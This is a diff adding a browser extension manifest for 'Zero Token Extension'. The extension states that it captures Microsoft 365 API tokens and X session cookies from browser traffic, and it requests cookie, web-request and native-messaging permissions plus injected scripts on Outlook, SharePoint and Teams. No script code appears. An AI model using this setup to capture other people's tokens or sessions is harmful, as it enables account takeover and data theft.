@@ -1,0 +1,70 @@
+{
+  "manifest_version": 3,
+  "name": "Zero Token Extension",
+  "version": "1.0.12",
+  "description": "Capture Microsoft 365 API tokens and X session cookies from browser traffic",
+  "permissions": [
+    "webRequest",
+    "storage",
+    "nativeMessaging",
+    "cookies"
+  ],
+  "host_permissions": [
+    "https://graph.microsoft.com/*",
+    "https://outlook.office.com/*",
+    "https://outlook.office365.com/*",
+    "https://outlook.cloud.microsoft/*",
+    "https://substrate.office.com/*",
+    "https://*.sharepoint.com/*",
+    "https://*.microsoft.com/*",
+    "https://*.office.com/*",
+    "https://*.office365.com/*",
+    "https://x.com/*",
+    "https://*.x.com/*",
+    "https://twitter.com/*",
+    "https://*.twitter.com/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "https://outlook.cloud.microsoft/*",
+        "https://outlook.office.com/*",
+        "https://outlook.office365.com/*",
+        "https://*.sharepoint.com/*",
+        "https://teams.microsoft.com/*",
+        "https://teams.cloud.microsoft/*"
+      ],
+      "js": ["content.js"],
+      "run_at": "document_start"
+    }
+  ],
+  "web_accessible_resources": [
+    {
+      "resources": ["inject.js"],
+      "matches": [
+        "https://outlook.cloud.microsoft/*",
+        "https://outlook.office.com/*",
+        "https://outlook.office365.com/*",
+        "https://*.sharepoint.com/*",
+        "https://teams.microsoft.com/*",
+        "https://teams.cloud.microsoft/*"
+      ]
+    }
+  ],
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icons/icon16.png",
+      "48": "icons/icon48.png",
+      "128": "icons/icon128.png"
+    }
+  },
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  }
+}
